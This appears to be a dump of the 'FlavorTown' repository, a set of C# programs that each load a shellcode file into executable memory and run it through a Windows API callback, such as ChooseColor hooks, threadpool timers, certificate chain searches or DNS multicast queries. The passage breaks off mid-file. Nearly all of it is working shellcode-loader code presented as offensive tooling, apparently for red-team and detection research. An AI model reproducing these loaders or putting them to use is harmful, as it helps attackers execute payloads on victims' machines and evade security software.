Project Path: arc_gmh5225_FlavorTown_2fr6kpnp

Source Tree:

```txt
arc_gmh5225_FlavorTown_2fr6kpnp
├── C
│   ├── BindImageEx.c
│   ├── CDefFolderMenu_Create2.c
│   ├── CertCreateContext.c
│   ├── CertEnumPhysicalStore.c
│   ├── CertFindChainInStore.c
│   ├── ChooseColor.c
│   ├── ChooseFont.c
│   ├── ClusWorkerCreate.c
│   ├── CopyFileEx.c
│   ├── CopyFileTransacted.c
│   ├── CreateThreadPoolTimer.c
│   ├── CreateThreadPoolWork.c
│   ├── DSA_EnumCallback.c
│   ├── DdeInitialize.c
│   ├── DirectDrawEnumerateExA.c
│   ├── DnsServiceBrowse.c
│   ├── DnsStartMulticastQuery.c
│   ├── DrawState.c
│   ├── EncryptedFileRaw.c
│   ├── EvtSubscribe_CVEEventWrite.c
│   ├── FCICreate.c
│   ├── FindText.c
│   ├── GetOpenFileName.c
│   ├── GetSaveFileName.c
│   ├── GrayString.c
│   ├── InternetSetStatusCallback.c
│   ├── LineDDA.c
│   ├── MFAddPeriodicCallback.c
│   ├── MI_Session_Close.c
│   ├── MI_Session_Invoke.c
│   ├── MagSetWindowTransform.c
│   ├── MessageBoxIndirect.c
│   ├── MiniDumpWriteDump.c
│   ├── NPAddConnection3.c
│   ├── NotifyIpInterfaceChange.c
│   ├── NotifyNetworkConnectivityHintChange.c
│   ├── NotifyRouteChange2.c
│   ├── NotifyTeredoPortChange.c
│   ├── NotifyUnicastIpAddressChange.c
│   ├── OleUIBusy.c
│   ├── PageSetupDlg.c
│   ├── PdhBrowseCounters.c
│   ├── PerfStartProviderEx.c
│   ├── PowerRegisterForEffectivePowerModeNotifications.c
│   ├── PrintDlg.c
│   ├── RegisterWaitChainCOMCallback.c
│   ├── RegisterWaitForSingleObject.c
│   ├── ReplaceText.c
│   ├── RoInspectCapturedStackBackTrace.c
│   ├── RoInspectThreadErrorInfo.c
│   ├── SHBrowseForFolder.c
│   ├── SHCreateThreadWithHandle.c
│   ├── SetWaitableTimer.c
│   ├── SetupInstallFile.c
│   ├── SetupIterateCabinet.c
│   ├── StackWalk.c
│   ├── SymRegisterCallback.c
│   ├── TaskDialogIndirect.c
│   ├── TrySubmitThreadpoolCallback.c
│   ├── WinBioCaptureSampleWithCallback.c
│   ├── WinBioEnrollCaptureWithCallback.c
│   ├── WinBioVerifyWithCallback.c
│   ├── WinHttpSetStatus.c
│   ├── WindowsInspectString.c
│   ├── WriteEncryptedFileRaw.c
│   ├── WscRegisterForChanges.c
│   ├── acmDriverEnum.c
│   ├── acmFilterChoose.c
│   ├── acmFormatTagEnum.c
│   └── waveOutOpen.c
├── C#
│   ├── CDefFolderMenu_Create2.cs
│   ├── CertFindChainInStore.cs
│   ├── ChooseColor.cs
│   ├── ChooseFont.cs
│   ├── ClusWorkerCreate.cs
│   ├── CopyFileTransacted.cs
│   ├── CreateThreadpoolTimer.cs
│   ├── CreateThreadpoolWork.cs
│   ├── DSA_EnumCallback.cs
│   ├── DirectDrawEnumerateExA.cs
│   ├── DnsStartMulticastQuery.cs
│   ├── EncryptedFileRaw.cs
│   ├── EvtSubscribe_CVEEventWrite.cs
│   ├── FCICreate.cs
│   ├── FindText.cs
│   ├── GetOpenFileName.cs
│   ├── GetSaveFileName.cs
│   ├── GrayString.cs
│   ├── InternetSetStatusCallback.cs
│   ├── LineDDA.cs
│   ├── MFAddPeriodicCallback.cs
│   ├── MessageBoxIndirect.cs
│   ├── MiniDumpWriteDump.cs
│   ├── NotifyIpInterfaceChange.cs
│   ├── NotifyNetworkConnectivityHintChange.cs
│   ├── NotifyRouteChange2.cs
│   ├── NotifyTeredoPortChange.cs
│   ├── NotifyUnicastIpAddressChange.cs
│   ├── OleUIBusy.cs
│   ├── PageSetupDlg.cs
│   ├── PdhBrowseCounters.cs
│   ├── PerfStartProviderEx.cs
│   ├── PowerRegisterForEffectivePowerModeNotifications.cs
│   ├── PrintDlg.cs
│   ├── RegisterWaitChainCOMCallback.cs
│   ├── RegisterWaitForSingleObject.cs
│   ├── ReplaceText.cs
│   ├── SHBrowseForFolder.cs
│   ├── SHCreateThreadWithHandle.cs
│   ├── SetWaitableTimer.cs
│   ├── StackWalk.cs
│   ├── SymRegisterCallback.cs
│   ├── TaskDialogIndirect.cs
│   ├── TrySubmitThreadpoolCallback.cs
│   ├── WinBioCaptureSampleWithCallback.cs
│   ├── WinBioEnrollCaptureWithCallback.cs
│   ├── WinBioVerifyWithCallback.cs
│   ├── WinHttpSetStatusCallback.cs
│   ├── WindowsInspectString.cs
│   └── acmDriverEnum.cs
├── LICENSE
└── README.md

```

`C#/CDefFolderMenu_Create2.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CDefFolderMenu_Create2
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: CDefFolderMenu_Create2.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc,
                payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr ICM = IntPtr.Zero;

            CDefFolderMenu_Create2(IntPtr.Zero,
                IntPtr.Zero, 0, IntPtr.Zero,
                IntPtr.Zero, hAlloc, 0, IntPtr.Zero, out ICM);

        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Shell32.dll")]
        static extern IntPtr CDefFolderMenu_Create2(
            IntPtr pidlFolder,
            IntPtr hwnd,
            uint cidl,
            IntPtr apidl,
            IntPtr psf, 
            IntPtr pfn, 
            uint nKeys, 
            IntPtr ahkeys, 
            out IntPtr ppcm);

    }
}

```

`C#/CertFindChainInStore.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CertFindChainInStore
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: CertFindChainInStore.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            IntPtr hCertStore = CertOpenSystemStore(0, "MY");

            CERT_CHAIN_FIND_BY_ISSUER_PARA sCCFIP = new CERT_CHAIN_FIND_BY_ISSUER_PARA();
            sCCFIP.pfnFindCallback = hAlloc;
            sCCFIP.cbSize = (uint)Marshal.SizeOf(sCCFIP);

            CertFindChainInStore(
                hCertStore,
                0x1,
                0,
                1,
                ref sCCFIP,
                IntPtr.Zero);

            //Cleanup
            CertCloseStore(hCertStore, 0);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("crypt32.dll", CharSet = CharSet.Unicode)]
        public static extern IntPtr CertOpenSystemStore(
            uint hProv,
            String szSubsystemProtocol
            );

        [DllImport("crypt32.dll", SetLastError = true)]
        public static extern IntPtr CertFindChainInStore(
            IntPtr hCertStore,
            uint dwCertEncodingType,
            uint dwFindFlags,
            uint dwFindType,
            ref CERT_CHAIN_FIND_BY_ISSUER_PARA pvFindPara,
            IntPtr pPrevChainContext);

        [DllImport("crypt32.dll", SetLastError = true)]
        public static extern bool CertCloseStore(IntPtr storeProvider, int flags);

        public struct CERT_CHAIN_FIND_BY_ISSUER_PARA
        {
            public uint cbSize;
            public string pszUsageIdentifier;
            public uint dwKeySpec;
            public uint dwAcquirePrivateKeyFlags;
            public uint cIssuer;
            public IntPtr rgIssuer;
            public IntPtr pfnFindCallback;
            public IntPtr pvFindArg;
            public uint dwIssuerChainIndex;
            public uint dwIssuerElementIndex;
        }
    }
}

```

`C#/ChooseColor.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ChooseColor
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: ChooseColor.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            uint CC_ENABLEHOOK = 0x10;

            CHOOSECOLOR sCC = new CHOOSECOLOR();
            sCC.lStructSize = (uint)Marshal.SizeOf(sCC);
            sCC.Flags = CC_ENABLEHOOK;
            sCC.lpfnHook = hAlloc;

            ChooseColor(ref sCC);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Comdlg32.dll")]
        public extern static bool ChooseColor(ref CHOOSECOLOR lpcc);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct CHOOSECOLOR
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public uint rgbResult;
            public IntPtr lpCustColors;
            public uint Flags;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpTemplateName;
        }
    }
}

```

`C#/ChooseFont.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ReplaceText
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: ReplaceText.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            int CF_ENABLEHOOK = 0x8;

            CHOOSEFONT sCF = new CHOOSEFONT();
            sCF.lStructSize = Marshal.SizeOf(sCF);
            sCF.Flags = CF_ENABLEHOOK;
            sCF.lpfnHook = hAlloc;

            ChooseFont(ref sCF);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comdlg32.dll")]
        public extern static bool ChooseFont(ref CHOOSEFONT lpcf);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct CHOOSEFONT
        {
            public int lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hDC;
            public IntPtr lpLogFont;
            public int iPointSize;
            public int Flags;
            public int rgbColors;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public string lpTemplateName;
            public IntPtr hInstance;
            public string lpszStyle;
            public short nFontType;
            private short __MISSING_ALIGNMENT__;
            public int nSizeMin;
            public int nSizeMax;
        }
    }
}

```

`C#/ClusWorkerCreate.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClusWorkerCreate
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: ClusWorkerCreate.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            CLUS_WORKER sCW = new CLUS_WORKER();
            ClusWorkerCreate(out sCW, hAlloc, IntPtr.Zero);

            uint INFINITE = 0xffffffff;
            ClusWorkerTerminateEx(ref sCW, INFINITE, true);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress,
            int dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("ResUtils.dll")]
        static extern IntPtr ClusWorkerCreate(out CLUS_WORKER lpWorker,
            IntPtr lpStartAddress, IntPtr lpParameter);

        [DllImport("ResUtils.dll")]
        static extern IntPtr ClusWorkerTerminateEx(ref CLUS_WORKER ClusWorker,
            uint TimeoutInMilliseconds, bool WaitOnly);

        struct CLUS_WORKER
        {
            public IntPtr hThread;
            public bool Terminate;
        }
    }
}
```

`C#/CopyFileTransacted.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CopyFileTransacted
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: CopyFileTransacted.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc,
                payload.Length, 0x20/*RX*/, out oldProtect);

            string szTempFile = System.IO.Path.GetTempFileName();

            IntPtr hTransaction = CreateTransaction(IntPtr.Zero, IntPtr.Zero, 0, 0, 0, 0, string.Empty);
            CopyFileTransacted(@"C:\Windows\notepad.exe", szTempFile, hAlloc, IntPtr.Zero, 0, 0x0, hTransaction);

            //Cleanup
            System.IO.File.Delete(szTempFile);
            CloseHandle(hTransaction);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("KtmW32.dll")]
        static extern IntPtr CreateTransaction(IntPtr lpTransactionAttributes, IntPtr UOW, uint CreateOptions, uint IsolationLevel, uint IsolationFlags, uint Timeout, string Description);

        [DllImport("kernel32.dll")]
        static extern bool CopyFileTransacted(string lpExistingFileName, string lpNewFileName,
            IntPtr lpProgressRoutine, IntPtr lpData, Int32 pbCancel,
            uint dwCopyFlags, IntPtr hTransaction);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);
    }
}

```

`C#/CreateThreadpoolTimer.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CreateThreadpoolTimer
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: CreateThreadpoolTimer.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            LargeInteger lDueTime = new LargeInteger();
            FILETIME sFiletime = new FILETIME();
            lDueTime.QuadPart = -(10000000);
            sFiletime.DateTimeLow = (uint)lDueTime.Low;
            sFiletime.DateTimeHigh = (uint)lDueTime.High;

            IntPtr TPTimer = CreateThreadpoolTimer(hAlloc, IntPtr.Zero, IntPtr.Zero);
            SetThreadpoolTimer(TPTimer, ref sFiletime, 0, 0);

            System.Threading.Thread.Sleep(1500);

            WaitForThreadpoolTimerCallbacks(TPTimer, false);

            if (TPTimer != IntPtr.Zero)
            {
                CloseThreadpoolTimer(TPTimer);
            }
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThreadpoolTimer(
            IntPtr pfnti,
            IntPtr pv,
            IntPtr pcbe);

        [DllImport("kernel32.dll")]
        static extern void SetThreadpoolTimer(
            IntPtr pti,
            ref FILETIME pv,
            uint msPeriod,
            uint msWindowLength);

        [DllImport("kernel32.dll")]
        static extern void WaitForThreadpoolTimerCallbacks(
            IntPtr pti,
            bool fCancelPendingCallbacks);

        [DllImport("kernel32.dll")]
        static extern void CloseThreadpoolTimer(
            IntPtr pti);

        [StructLayout(LayoutKind.Sequential)]
        public struct FILETIME
        {
            public uint DateTimeLow;
            public uint DateTimeHigh;
        }

        [StructLayout(LayoutKind.Explicit)]
        private struct LargeInteger
        {
            [FieldOffset(0)]
            public int Low;
            [FieldOffset(4)]
            public int High;
            [FieldOffset(0)]
            public long QuadPart;
            public long ToInt64()
            {
                return ((long)this.High << 32) | (uint)this.Low;
            }

            public static LargeInteger FromInt64(long value)
            {
                return new LargeInteger
                {
                    Low = (int)(value),
                    High = (int)((value >> 32))
                };
            }

        }
    }
}

```

`C#/CreateThreadpoolWork.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CreateThreadpoolWork
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: CreateThreadpoolWork.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr TPWork = CreateThreadpoolWork(hAlloc, IntPtr.Zero, IntPtr.Zero);
            SubmitThreadpoolWork(TPWork);

            WaitForThreadpoolWorkCallbacks(TPWork, false);

            if (TPWork != IntPtr.Zero)
            {
                CloseThreadpoolWork(TPWork);
            }
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThreadpoolWork(
            IntPtr pfnwk,
            IntPtr pv,
            IntPtr pcbe);

        [DllImport("kernel32.dll")]
        static extern void SubmitThreadpoolWork(
            IntPtr pwkl);

        [DllImport("kernel32.dll")]
        static extern void WaitForThreadpoolWorkCallbacks(
            IntPtr pwk,
            bool fCancelPendingCallbacks);

        [DllImport("kernel32.dll")]
        static extern void CloseThreadpoolWork(
            IntPtr pwk);

    }
}

```

`C#/DSA_EnumCallback.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DSA_EnumCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: DSA_EnumCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            IntPtr hDSA = DSA_Create(1, 1);

            DSA_InsertItem(hDSA, 0x7fffffff, hDSA); //Append

            DSA_EnumCallback(hDSA, hAlloc, IntPtr.Zero);

            DSA_Destroy(hDSA);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Comctl32.dll")]
        static extern IntPtr DSA_Create(
             int cbItem,
             int cItemGrow);

        [DllImport("Comctl32.dll")]
        static extern void DSA_InsertItem(
             IntPtr hdsa,
             int i,
             IntPtr pItem);

        [DllImport("Comctl32.dll")]
        static extern void DSA_EnumCallback(
             IntPtr hdsa,
             IntPtr pfnCB,
             IntPtr pData);

        [DllImport("Comctl32.dll")]
        static extern bool DSA_Destroy(IntPtr hdsa);
    }
}

```

`C#/DirectDrawEnumerateExA.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DirectDrawEnumerateExA
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: DirectDrawEnumerateExA.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            DirectDrawEnumerateExA(hAlloc, IntPtr.Zero, 0);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Ddraw.dll")]
        public extern static IntPtr DirectDrawEnumerateExA(
            IntPtr lpCallback,
            IntPtr lpContext,
            uint dwFlags);

    }
}

```

`C#/DnsStartMulticastQuery.cs`:

```cs
// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DnsStartMulticastQuery
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: DnsStartMulticastQuery.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            uint DNS_QUERY_REQUEST_VERSION1 = 0x1;
            ushort DNS_TYPE_ZERO = 0x0;
            UInt64 DNS_QUERY_STANDARD = 0x0;

            MDNS_QUERY_REQUEST sMDNS = new MDNS_QUERY_REQUEST();
            sMDNS.Version = DNS_QUERY_REQUEST_VERSION1;
            sMDNS.ulRefCount = 0;
            sMDNS.Query = "Wra7h"; //Doesn't seem to matter
            sMDNS.QueryType = DNS_TYPE_ZERO;
            sMDNS.QueryOptions = DNS_QUERY_STANDARD;
            sMDNS.InterfaceIndex = 0;
            sMDNS.pQueryCallback = hAlloc;
            sMDNS.pQueryContext = IntPtr.Zero;


            MDNS_QUERY_HANDLE sMDNSHandle = new MDNS_QUERY_HANDLE();

            DnsStartMulticastQuery(sMDNS, out sMDNSHandle);
            DnsStopMulticastQuery(ref sMDNSHandle);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        public struct MDNS_QUERY_REQUEST
        {
            public uint Version;
            public uint ulRefCount;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string Query;
            public ushort QueryType;
            public UInt64 QueryOptions;
            public uint InterfaceIndex;
            public IntPtr pQueryCallback;
            public IntPtr pQueryContext;
            public bool fAnswerReceived;
            public uint ulResendCount;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct MDNS_QUERY_HANDLE
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)] 
            public string nameBuf;
            public ushort wType;
            public IntPtr pSubscription;
            public IntPtr pWnfCallbackParams;
            public ulong stateNameData;
        }

        [DllImport("dnsapi.dll")]
        public extern static long DnsStartMulticastQuery(
            MDNS_QUERY_REQUEST pQueryRequest,
            out MDNS_QUERY_HANDLE pHandle);

        [DllImport("dnsapi.dll")]
        public extern static long DnsStopMulticastQuery(
            ref MDNS_QUERY_HANDLE pHandle);
    }
}

```

`C#/EncryptedFileRaw.cs`:

```cs
// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace EncryptedFileRaw
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: EncryptedFileRaw.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/); 
            
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            
            uint oldProtect;
            VirtualProtectEx(
